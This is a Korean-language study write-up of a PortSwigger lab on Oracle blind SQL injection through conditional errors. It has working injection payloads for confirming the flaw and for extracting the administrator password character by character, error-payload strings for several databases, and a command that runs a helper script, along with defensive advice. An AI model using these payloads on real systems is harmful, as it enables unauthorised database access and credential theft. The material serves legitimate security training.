# Lab: Blind SQL injection with conditional errors

## 개요

- **난이도**: Practitioner
- **주제**: SQL Injection — Blind / Conditional Errors (Oracle)
- **링크**: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
- **참고**: https://portswigger.net/web-security/sql-injection/cheat-sheet
- **도구**: [tools/01-sqli-012-blind-conditional-errors.py](../tools/01-sqli-012-blind-conditional-errors.py)

## 목표

Oracle DB에서 조건부 에러를 유발하여 HTTP 상태 코드 차이(500 vs 200)를 단서로 삼아 `administrator` 비밀번호를 추출하고 로그인한다.

## 011 랩과의 차이

011은 응답 **내용**이 달라졌다. 이 랩은 응답 내용에는 아무 차이가 없고 **HTTP 상태 코드**만 달라진다. 단서가 더 미약해진 셈이다.

| 항목 | 011 (Conditional Responses) | 012 (Conditional Errors) |
|------|----------------------------|--------------------------|
| 단서 | 응답 본문 (`Welcome back!` 유무) | HTTP 상태 코드 (200 vs 500) |
| 조건 참일 때 | 특정 문자열 표시 | 서버 에러 발생 (HTTP 500) |
| 조건 거짓일 때 | 문자열 미표시 | 정상 응답 (HTTP 200) |
| DB | PostgreSQL | Oracle |

## Oracle 조건부 에러 페이로드 구조

Oracle에서 조건이 참일 때 의도적으로 에러를 발생시키는 핵심은 `CASE WHEN`과 `TO_CHAR(1/0)` 조합이다.

```sql
' || (SELECT CASE WHEN (<조건>) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) || '
```

| 요소 | 역할 |
|------|------|
| `\|\|` | Oracle 문자열 연결 연산자로 쿼리에 삽입 |
| `CASE WHEN` | 조건 분기 |
| `TO_CHAR(1/0)` | 0으로 나누기 → ORA-01476 에러 → HTTP 500 |
| `ELSE 'a'` | 조건 거짓일 때 정상 값 반환 → HTTP 200 |
| `FROM DUAL` | Oracle에서 테이블 없이 값만 반환할 때 필요한 더미 테이블 |

동작 흐름:

```
조건이 참  → TO_CHAR(1/0) 실행 → ORA-01476 (divisor equal to zero) → HTTP 500
조건이 거짓 → 'a' 반환           → 정상 처리                         → HTTP 200
```

## 풀이

### 1단계 — 취약점 확인

```sql
-- 참 (HTTP 500 기대)
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) || '

-- 거짓 (HTTP 200 기대)
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) || '
```

두 응답의 HTTP 상태 코드가 다르면 취약점이 존재한다.

### 2단계 — 비밀번호 길이 탐색

```sql
' || (SELECT CASE WHEN LENGTH(password)>20
     THEN TO_CHAR(1/0) ELSE 'a' END
     FROM users WHERE username='administrator') || '
```

HTTP 500이면 길이가 20 초과, HTTP 200이면 20 이하. 이진 탐색으로 좁힌다.

### 3단계 — 문자 추출

Oracle은 `SUBSTR` 사용 (`SUBSTRING` 미지원).

```sql
' || (SELECT CASE WHEN SUBSTR(password,1,1)>'m'
     THEN TO_CHAR(1/0) ELSE 'a' END
     FROM users WHERE username='administrator') || '
```

### 스크립트 실행

```bash
python3 tools/01-sqli-012-blind-conditional-errors.py \
  "https://xxxx.web-security-academy.net" \
  "TrackingId값"
```

## 핵심 정리

- 응답 내용에 차이가 없어도 **HTTP 상태 코드**가 다르면 Blind SQLi가 가능하다.
- Oracle은 `TO_CHAR(1/0)`으로 의도적 에러를 발생시키고, 이를 `CASE WHEN`으로 조건과 연결한다.
- Oracle 고유 문법: `SUBSTR`(SUBSTRING 불가), `||` 연결, `FROM DUAL` 필수.
- **방어**: Prepared Statement 사용, 500 에러를 일관된 에러 페이지로 처리하여 상태 코드 차이 제거.

## 배운 점 및 추가 학습

### 1. SQL Injection 포인트를 찾는 방법

Blind SQLi를 비롯한 모든 SQL injection은 포인트를 먼저 찾아야 한다. 포인트 탐색은 자동과 수동 두 가지로 접근한다.

**수동 탐색 — 모든 입력 경로에 특수문자 삽입**

HTTP 요청에서 DB와 상호작용할 수 있는 입력 경로는 다양하다.

| 입력 경로 | 예시 |
|-----------|------|
| URL 파라미터 | `?category=Gifts'` |
| POST 바디 | `username=admin'` |
| 쿠키 | `TrackingId=xyz'` |
| HTTP 헤더 | `X-Forwarded-For: 1.1.1.1'`, `User-Agent: test'` |
| Referer | `Referer: https://example.com/'` |

각 위치에 `'`를 삽입해 응답이 달라지는지 확인한다. 달라지면 해당 값이 SQL에 삽입되고 있다는 신호다.

**자동 탐색 — Burp Suite Scanner / sqlmap**

- Burp Suite Pro의 Active Scanner는 모든 파라미터에 자동으로 SQLi 페이로드를 시도한다.
- `sqlmap -u "URL" --crawl=2`로 크롤링하며 자동 탐지할 수 있다.

### 2. Blind SQLi인지 어떻게 알 수 있나?

"Blind인지 아닌지"를 미리 알기는 어렵다. 실제로는 아래 순서로 판단한다.

```
① 일단 UNION 공격을 시도한다
        ↓
   결과가 화면에 보임 → UNION 기반 SQLi로 진행
        ↓
   결과가 보이지 않음 → Blind 여부 확인 단계로 이동
        ↓
② 응답 내용 차이가 있는가? → Conditional Responses (011)
        ↓
   응답 내용은 같은데 상태 코드가 다른가? → Conditional Errors (012)
        ↓
   상태 코드도 같은가? → Time-based Blind SQLi 시도
```

즉, Blind SQLi는 **UNION이 안 될 때 다음으로 시도하는 방법**이다. 처음부터 Blind임을 알고 시작하는 것이 아니라, 시도해보면서 단서의 종류를 파악하는 과정이다.

### 3. Blind SQLi 단서 유형 총정리 (011~)

| 유형 | 단서 | 판별 방법 | 예시 기법 |
|------|------|-----------|-----------|
| Conditional Responses | 응답 내용 차이 | 특정 문자열 유무 | `AND '1'='1` |
| Conditional Errors | HTTP 상태 코드 차이 | 500 vs 200 | `TO_CHAR(1/0)` |
| Time-based | 응답 시간 차이 | 지연 발생 여부 | `pg_sleep(5)`, `SLEEP(5)` |
| Out-of-band | 외부 네트워크 요청 | DNS/HTTP 요청 발생 여부 | `UTL_HTTP`, `LOAD_FILE` |

### 4. DBMS별 조건부 에러 페이로드

[PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)의 Conditional errors 항목 기준.

| DBMS | 에러 유발 페이로드 |
|------|-------------------|
| Oracle | `SELECT CASE WHEN (조건) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL` |
| PostgreSQL | `SELECT CASE WHEN (조건) THEN CAST(1/0 AS TEXT) ELSE 'a' END` |
| MySQL | `SELECT IF(조건, (SELECT table_name FROM information_schema.tables), 'a')` |
| MSSQL | `SELECT CASE WHEN (조건) THEN 1/0 ELSE 'a' END` |

### 5. 추가로 고민해볼 것

- 포인트 탐색과 Blind 여부 판단은 결국 **반복 실험**이다. 처음부터 정답을 알고 시작하는 것이 아니라, 응답 차이를 보며 가설을 세우고 검증하는 과정이다.
- WAF가 있으면 `'` 하나에도 403이 반환될 수 있어 포인트 탐색 자체가 어려워진다. 이 경우 인코딩·우회 기법이 추가로 필요하다.
- 다음 단계인 Time-based Blind는 단서가 더욱 약하다. 네트워크 지연과 실제 DB 지연을 구분해야 하기 때문에 임계값 설정이 중요하다.
